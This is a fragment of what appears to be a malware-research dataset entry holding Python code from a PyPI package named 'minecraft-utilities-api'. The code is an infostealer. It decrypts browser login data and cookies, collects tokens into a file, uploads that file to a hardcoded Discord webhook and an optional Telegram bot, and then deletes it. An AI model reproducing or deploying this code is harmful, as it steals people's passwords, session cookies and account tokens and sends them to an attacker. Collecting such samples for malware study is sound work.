Cookie file\\n\")\n    else:\n        with open(fileInfo, \"a\") as f:\n            f.write(f\"{name} Local State file missing\\n\")\n\ndef main_tokens():\n    for platform, path in tokenPaths.items():\n        if not os.path.exists(path):\n            continue\n        try:\n            tokens = set(get_tokens(path))\n        except:\n            continue\n        if not tokens:\n            continue\n        with open(fileInfo, \"a\") as f:\n            for i in tokens:\n                f.write(str(i) + \"\\n\")\n\ndef decrypt_files(path, browser):\n    if os.path.exists(path):\n        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)\n    else:\n        with open(fileInfo, \"a\") as f:\n            f.write(browser + \" not installed\\n\")\n\ndef post_to(file):\n    token = \"TELEGRAM TOKEN\"\n    chat_id = \"TELEGRAM CHATID\"\n    webhook_url = \"https://discordapp.com/api/webhooks/1097233590070300812/YX9qYsEi0yMX5gHppNUuzk9-C4P7ZeDHVeKvWioAyMXtBp5R-KcT0d4EDdhwygTqY7iq\"\n    if token == \"TELEGRAM TOKEN\":\n        pass\n    else:\n        if chat_id == \"TELEGRAM CHATID\":\n            pass\n        else:\n            post(\"https://api.telegram.org/bot\" + token + \"/sendDocument\", data={'chat_id': chat_id}, files={'document': open(file, 'rb')})\n    if webhook_url == \"WEBHOOK URL\":\n        pass\n    else:\n        post(webhook_url, files={'files': open(file, 'rb')})\n\ndef file_handler(file):\n    if os.path.exists(file):\n        if \".txt\" in file:\n            post_to(file)\n        os.remove(file)\n"
    }
  },
  {
    "metadata": {
      "package_name": "minecraft-utilities-api-0.4.1",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/minecraft-utilities-api-0.4.1/minecraft-utilities-api-0.4.1/minecraft-utilities-api/minecraft-api.py",
      "code_hash": "899eb06aab587ae3b8024cec0f521edd"
    }
  }
]